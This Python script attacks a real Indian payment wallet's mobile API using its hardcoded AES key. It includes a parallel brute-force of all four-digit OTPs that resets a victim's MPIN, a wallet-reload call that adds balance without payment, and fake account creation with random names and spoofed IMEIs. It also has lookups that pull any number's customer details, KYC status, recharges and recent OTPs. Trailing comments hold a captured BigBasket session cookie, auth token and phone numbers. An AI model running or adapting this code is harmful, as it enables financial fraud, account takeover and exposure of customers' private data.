# coding=utf-8



FNAME = ['Abhay', 'Adesh', 'Adhik', 'Aditya', 'Agni', 'Ajay', 'Ajeet', 'Ajit', 'Ajith', 'Akash', 'Akhil', 'Amar',
         'Amit', 'Amrit', 'Anand', 'Ananden', 'Anandha', 'Anant', 'Ananta-Sesa', 'Ananth', 'Anil', 'Aniruddha', 'Anish',
         'Ankur', 'Anuj', 'Anupam', 'Aravind', 'Aravinda', 'Arjun', 'Arjuna', 'Arun', 'Aruna', 'Aseem', 'Ashok',
         'Ashoka', 'Avinash', 'Baladeva', 'Baldev', 'Bharat', 'Bharata', 'Bhaskar', 'Bhaskara', 'Bishen', 'Brahma',
         'Brijesh', 'Brijesha', 'Buddha', 'Carpanin', 'Chandan', 'Chander', 'Chandrakant', 'Chandraradj', 'Chanemouga',
         'Chanemougam', 'Chetan', 'Chiranjeevi', 'Chiranjivi', 'Cooldeepac', 'Damodar', 'Damodara', 'Darshan',
         'Dayanand', 'Dayaram', 'Deepak', 'Deo', 'Deodan', 'Dev', 'Deva', 'Devadas', 'Devaraja', 'Devayanne', 'Devdan',
         'Devdas', 'Devmani', 'Devraj', 'Dhananjay', 'Dharma', 'Dharmaradj', 'Dhaval', 'Dhruva', 'Dilip', 'Dilipa',
         'Dinesh', 'Dipak', 'Dipaka', 'Divyesh', 'Djagarajen', 'Djayssen', 'Djeyam', 'Drupada', 'Duleep', 'Ganapati',
         'Ganesh', 'Ganesha', 'Gautam', 'Gautama', 'Geevarghese', 'Girish', 'Girisha', 'Gobind', 'Gopal', 'Gopala',
         'Gopalkrishna', 'Gopinath', 'Gopinatha', 'Gotam', 'Gotama', 'Govind', 'Govinda', 'Govinden', 'Harendra',
         'Hari', 'Harinder', 'Harish', 'Harisha', 'Harishankar', 'Harsha', 'Harshad', 'Harshal', 'Hemacha dra',
         'Ilango', 'Inderpal', 'Indra', 'Indrajit', 'Isha', 'Ishvara', 'Ishwari', 'Itesh', 'Jagannath', 'Jagannatha',
         'Jagdish', 'Jagjit', 'Jai', 'Jaidev', 'Jayant', 'Jayanta', 'Jayendra', 'Jaywant', 'Jeetendra', 'Jitender',
         'Jitendra', 'Jitinder', 'Jiva', 'Jivan', 'Kadivel', 'Kadrivel', 'Kailash', 'Kalidas', 'Kalidasa', 'Kalyan',
         'Kalyana', 'Kama', 'Kamaradj', 'Kanda-Koumarane', 'Kapil', 'Kapila', 'Karan', 'Karna', 'Kartikeya', 'Kavi',
         'Kesavane', 'Kesaven', 'Keshavan', 'Kessavamohane', 'Kessavaperoumal', 'Keya', 'Kichenin', 'Kishan', 'Kishen',
         'Kishor', 'Kishore', 'Kistna', 'Komari', 'Krishna', 'Krishnaraja', 'Krishnin', 'Kshitij', 'Kumar', 'Kumara',
         'Kumaren', 'Kunal', 'Kunala', 'Lakshman', 'Lakshmana', 'Lal', 'Lalit', 'Laxman', 'Lekha', 'Lochan', 'Madhav',
         'Madhava', 'Madhukar', 'Mahavir', 'Mahavira', 'Mahendra', 'Mahesh', 'Mahesha', 'Mahinder', 'Mani', 'Manickam',
         'Maninder', 'Manish', 'Manu', 'Mardémoutou', 'Mayur', 'Mitul', 'Mogaya', 'Mohan', 'Mohandas', 'Mohinder',
         'Moryl', 'Mounoussamy', 'Mukesh', 'Mukesha', 'Mukul', 'Murali', 'Murugan', 'Nagendra', 'Nala', 'Nanda',
         'Narayan', 'Narayana', 'Narayanin', 'Narendra', 'Narinder', 'Nataraj', 'Naveen', 'Navin', 'Nikhil', 'Nil',
         'Ninad', 'Niraj', 'Nirav', 'Nirmal', 'Nishant', 'Nitin', 'Om', 'Outama', 'Pajani', 'Pajanivel', 'Pallab',
         'Pallav', 'Pankaj', 'Pankaja', 'Parth', 'Partha', 'Permal', 'Perumal', 'Poungodai', 'Pouranin', 'Pradip',
         'Pregassame', 'Pritam', 'Radjen', 'Radjiv', 'Radjou', 'Raghu', 'Rahul', 'Raj', 'Rajender', 'Rajendra',
         'Rajesh', 'Rajinder', 'Rajiv', 'Rajneesh', 'Rajnish', 'Rakesh', 'Rama', 'Ramachander', 'Ramachandra',
         'Ramakrishna', 'Ramesh', 'Ramesha', 'Rameshwar', 'Ranj', 'Ranjeet', 'Ranjit', 'Ratan', 'Ratnam', 'Ravi',
         'Ravindra', 'Rishi', 'Rohan', 'Rohit', 'Sachin', 'Saholy', 'Samourgom', 'Sandeep', 'Sandip', 'Sangaren',
         'Sanjay', 'Sanjaya', 'Sanjeet', 'Sanjeev', 'Sanjit', 'Sanjiv', 'Sankar', 'Sarad', 'Saral', 'Saravanan',
         'Satish', 'Satyakama', 'Savitr', 'Sejiyane', 'Sekar', 'Shankar', 'Shankara', 'Shanmouga', 'Shantanu', 'Sharma',
         'Shasty', 'Shekhar', 'Shiva', 'Shresth', 'Shrinivas', 'Shripati', 'Shrivatsa', 'Shyam', 'Shyamal', 'Sib',
         'Siddharta', 'Siddhartha', 'Singh', 'Sivacoumar', 'Skanda', 'Subhash', 'Sudarshan', 'Sudesh', 'Sudhir',
         'Sujay', 'Sukumar', 'Suman', 'Sumantra', 'Sundar', 'Sundara', 'Sundaram', 'Sunder', 'Sunil', 'Suraj',
         'Surendra', 'Suresh', 'Suresha', 'Surinder', 'Surya', 'Sushil', 'Swapan', 'Swapnil', 'Swaran', 'Tangavel',
         'Vadivel', 'Varghese', 'Variya', 'Vasant', 'Vasanta', 'Vassant', 'Vasu', 'Venkat', 'Venkata', 'Vidhyavathi',
         'Vignesh', 'Vijay', 'Vikram', 'Vikrama', 'Vikresen', 'Vimal', 'Vinay', 'Vipin', 'Vipul', 'Viraj', 'Vishal',
         'Vishnou', 'Vishnu', 'Vishvajit', 'Vivek', 'Vyasadeva', 'Yama', 'Yamaraja', 'Yash']
LNAME = ['Banerjee', 'Bhatnagar', 'Bose', 'Chatterjee', 'Chauhan', 'Chavan', 'Chopra', 'Das', 'Dasgupta', 'Dutta',
         'Gavde', 'Gupta', 'Jaiteley', 'Jayaraman', 'Jhadav', 'Kadam', 'Kapoor', 'Khan', 'Malhotra', 'Malik', 'Mehra',
         'Mehta', 'Mistry', 'Mukopadhyay', 'Nair', 'Patel', 'Patil', 'Pawar', 'Pillai', 'Rangan', 'Rangarajan', 'Rao',
         'Sarin', 'Saxena', 'Sen', 'Sengupta', 'Shah', 'Sharma', 'Singh', 'Singh', 'Subramanium', 'Tambe', 'Venkatesan',
         'Verma', 'Yadav']

import hashlib
import sys
from Crypto import Random
from Crypto.Cipher import AES
import random
import string


def random_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for x in range(size))


import json
from multiprocessing import Process
import time
import hashlib
import requests
from datetime import datetime
import base64

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()
unpad = lambda s: s[:-ord(s[len(s) - 1:])]
proc = []


def iv():
    """
    The initialization vector to use for encryption or decryption.
    It is ignored for MODE_ECB and MODE_CTR.
    """
    return chr(0) * 16


class AESCipher(object):
    """
    https://github.com/dlitz/pycrypto
    """

    def __init__(self, key):
        self.key = key
        # self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, message):
        """
        It is assumed that you use Python 3.0+
        , so plaintext's type must be str type(== unicode).
        """
        message = message.encode()
        raw = pad(message)
        cipher = AES.new(self.key, AES.MODE_CBC, iv())
        enc = cipher.encrypt(raw)
        return base64.b64encode(enc).decode('utf-8')

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        cipher = AES.new(self.key, AES.MODE_CBC, iv())
        dec = cipher.decrypt(enc)
        return unpad(dec).decode('utf-8')


key = 'TheSecretKeyXpay'

startTime = datetime.now()


def recharge(login_mob, rcMobileNum, prePostLan, circle, stdCode, accNo, mobOperator, rcType, txnAmount, mpin, operator,
             agent_code, rec_mode):
    mpin1 = AESCipher(key).encrypt(mpin)
    url1 = 'http://www.xpayindia.com/XPAY/web/client/merchws/xpayAPPCUMobRechargeIns.jsp'
    params = {
        'login_mob': login_mob,
        'rcMobileNum': rcMobileNum,
        'prePostLan': prePostLan,
        'circle': circle,
        'stdCode': stdCode,
        'accNo': accNo,
        'mobOperator': mobOperator,
        'rcType': rcType,
        'txnAmount': txnAmount,
        'mpin': mpin1,
        'operator': operator,
        'agent_code': agent_code,
        'rec_mode': rec_mode,
    }

    headers = {
        'Content-Length': '0',
        'Host': 'www.xpayindia.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/3.2.0', }

    r = requests.post(verify=False, url=url1, params=params, headers=header)


def submit_otp(otps, mob):
    for o in otps:
        otp = AESCipher(key).encrypt(o)
        url1 = "http://www.xpayindia.com/XPAY/web/client/merchws/xpayAPPCUMPINReset.jsp?"
        data = {"mobile_no": mob,
                "old_mpin": otp,
                "new_mpin": 'cZxDxOX+0HoPShjRvCNN9g==',
                }
        header = {'connection': 'Keep-Alive',
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'host': 'www.xpayindia.com',
                  'user-agent': 'Apache-HttpClient/UNAVAILABLE (java 1.4)',
                  }

        r = requests.post(verify=False, url=url1, data=data, headers=header)
        # print(o,str(r.text).strip())
        try:
            # pass
            d = json.loads(r.text)
            print(o, d)
            if (d["FLAG"] == "S"):
                print(o, d)
        except:
            # print("Error")
            pass


def runInParallel(num, mob):
    for i in num:
        p = Process(target=submit_otp, args=(i, mob,))
        p.start()
        proc.append(p)
    for p in proc:
        p.join()


def load_wallet(mob, pin, amt):
    url1 = "http://www.xpayindia.com/XPAY/api/XpayUaeProductReloadGateway.jsp?"
    data = {"product_code": '0011',
            "merchant_code": '101010',
            "mobile_no": mob,
            'amount': amt,
            'merch_ref_no': int(time.time()), #171126035568
            'remarks': 'UPI Wallet reload',
            'req_channel': 'UPI',

            }
    header = {'connection': 'Keep-Alive',
              'Content-Type': 'application/x-www-form-urlencoded',
              'host': 'www.xpayindia.com',
              'user-agent': 'Apache-HttpClient/UNAVAILABLE (java 1.4)',
              }

    r = requests.post(verify=False, url=url1, data=data, headers=header)
    d = json.loads(r.text)
    print(d)


def account_create(mob):
    print("Acc reation")
    # url1 = "http://www.xpaycashwallet.com/MobileApp/xpaycustregister?remMobileNo="+mob+"&custName="+random.choice(FNAME)+"&appId=891d57807eab30a4&reqFrom=A&imeiNo=86804"+mob+"&shareId=%23&modelId=Model&pinNo="+random_generator(6,"0123456789")+"&dob=01-01-1990&sex=M"
    url1 = "http://www.xpaycashwallet.com/MobileApp/xpaycustregister?remMobileNo=" + mob + "&custName=" + random.choice(
        FNAME) + "&appId=891d57807eab30a4&reqFrom=A&imeiNo=86804" + mob + "&shareId=%23&modelId=Model&pinNo=" + random_generator(
        6, "0123456789") + "&dob=01-01-1990&sex=M"

    header = {'connection': 'Keep-Alive',
              'Content-Type': 'application/x-www-form-urlencoded',
              'host': 'www.xpaycashwallet.com',
              'user-agent': 'okhttp/3.2.0',
              'Accept-Encoding': 'gzip'
              }

    r = requests.post(verify=False, url=url1, headers=header)
    d = json.loads(r.text)
    print(d)


def get_cust_details(mob):
    url1 = "http://www.xpaycashwallet.com/MobileApp/getcustomerdetails?custMobNo=" + mob

    header = {'connection': 'Keep-Alive',
              'Content-Type': 'application/x-www-form-urlencoded',
              'host': 'www.xpaycashwallet.com',
              'user-agent': 'okhttp/3.2.0',
              'Accept-Encoding': 'gzip'
              }

    r = requests.post(verify=False, url=url1, headers=header)
    d = json.loads(r.text)
    print(d)
    # print(d['CustomerDetails'][0]['custCardBalance'])


def get_kyc_details(mob):
    url1 = "http://www.xpayindia.com/XPAY/jspxpay/xpayCustForm60StatusCheck.jsp?mob_no=" + mob

    header = {'connection': 'Keep-Alive',
              'Content-Type': 'application/x-www-form-urlencoded',
              'host': 'www.xpayindia.com',
              'user-agent': 'okhttp/3.2.0',
              'Accept-Encoding': 'gzip'
              }

    r = requests.post(verify=False, url=url1, headers=header)
    d = json.loads(r.text)
    print(d)


def get_otp(mob):
    url1 = "http://www.xpayindia.com/XPAY/web/client/xpayAPPCustRecentOTPRpt.jsp?mobileNo=" + mob

    header = {'connection': 'Keep-Alive',
              'Content-Type': 'application/x-www-form-urlencoded',
              'host': 'www.xpayindia.com',
              'user-agent': 'okhttp/3.2.0',
              'Accept-Encoding': 'gzip'
              }

    r = requests.post(verify=False, url=url1, headers=header)
    d = json.loads(r.text)
    print(d)


def get_rech_details(mob):
    url1 = "http://www.xpayindia.com/XPAY/jspxpay/xpayAPPCUMOBDTHTopUpRpt.jsp?mobileNo=" + mob

    header = {'connection': 'Keep-Alive',
              'Content-Type': 'application/x-www-form-urlencoded',
              'host': 'www.xpayindia.com',
              'user-agent': 'okhttp/3.2.0',
              'Accept-Encoding': 'gzip'
              }

    r = requests.post(verify=False, url=url1, headers=header)
    d = json.loads(r.text)
    print(d)


z = []
for i in range(0, 500):
    z.append(str(i).zfill(4))
# print(z)
x = []
for i in range(500, 1000):
    x.append(str(i).zfill(4))
# print(x)

y = []
for i in range(1000, 1500):
    y.append(str(i).zfill(4))
# print(y)

x1 = []
for i in range(1500, 2000):
    x1.append(str(i).zfill(4))
# print(x1)


y1 = []
for i in range(2000, 2500):
    y1.append(str(i).zfill(4))
# print(y1)

x2 = []
for i in range(2500, 3000):
    x2.append(str(i).zfill(4))
# print(x2)

y2 = []
for i in range(3000, 3500):
    y2.append(str(i).zfill(4))
# print(y2)

y3 = []
for i in range(3500, 4000):
    y3.append(str(i).zfill(4))
# print(y3)

y4 = []
for i in range(4000, 4500):
    y4.append(str(i).zfill(4))
# print(y4)

y5 = []
for i in range(4500, 5000):
    y5.append(str(i).zfill(4))
# print(y5)

y6 = []
for i in range(5000, 5500):
    y6.append(str(i).zfill(4))
# print(y6)

y7 = []
for i in range(5500, 6000):
    y7.append(str(i).zfill(4))
# print(y7)

y8 = []
for i in range(6000, 6500):
    y8.append(str(i).zfill(4))
# print(y5)

y9 = []
for i in range(6500, 7000):
    y9.append(str(i).zfill(4))
# print(y6)

y10 = []
for i in range(7000, 7500):
    y10.append(str(i).zfill(4))

y11 = []
for i in range(7500, 8000):
    y11.append(str(i).zfill(4))

y12 = []
for i in range(8000, 8500):
    y12.append(str(i).zfill(4))

y13 = []
for i in range(8500, 9000):
    y13.append(str(i).zfill(4))

y14 = []
for i in range(9000, 9500):
    y14.append(str(i).zfill(4))

y15 = []
for i in range(9500, 10000):
    y15.append(str(i).zfill(4))
# 7811250900
# 9984181456
if __name__ == '__main__':
    enc = AESCipher(key).encrypt('1234')
    print(enc)
    a = input()
    #print(AESCipher(key).decrypt(a))

    for mob in [a]:
        # print(startTime)
        #  account_create(mob)
        # submit_otp(['4556','1234'],mob)
        # runInParallel([z,x,y,x1,y1,x2,y2,y3,y4,y5,y6,y7,y8,y9,y10,y11,y12,y13,y14,y15],mob)
        # runInParallel([y11,y12,y13,y14],mob)
        amt=input()
        load_wallet(mob,'5555',amt+'.0')
        print(mob)
        # get_rech_details(mob)
        get_cust_details(mob)
        # get_kyc_details(mob)
        #get_otp(mob)
        # print(datetime.now() - startTime)
        #     Cookie: _bb_vid="MzA1NTkxMTgxNg==";source="BB_Android/v3.4.0/os_6.0.1";BBAUTHTOKEN="MJG2BgIeHfzes6hUdodke2N7ImRldmljZV9pZCI6ICJiZGNmZDUyYTI1NzEyMGU4IiwgImNoYWZmIjogImFxb1hsUzJRay9LUmNnPT1cbiIsICJtaWQiOiAyOTk3NzgyLCAidmlkIjogMjMzMTQ4MjYyLCAidGltZSI6IDE0OTc3MDYxNjYuNzgzMTQyfQ=="; _bb_nhid="83"; _bb_loid="397"; _bb_dsid="708"; _bb_cid="1"
        # Content-Type: application/x-www-form-urlencoded
        # Content-Length: 168
        # Host: www.bigbasket.com
        # Connection: Keep-Alive 8853267035
        # Accept-Encoding: gzip
        # X-NewRelic-ID: XAUAUlZXGwUGVVdRBwA=
        # {u'add_date': u'2017-07-19 22:25:00.11', u'otp': u'833382', u'req_type': u'TXN'}
        # txn_id=642768&order_id=29015876&payment_type=hdfc-power-pay&pay_now=1&wallet=0&csr=0&status=0&err_res_code=204&amount=8.00&err_res_desc=sdk%20browser%20-%20back%20press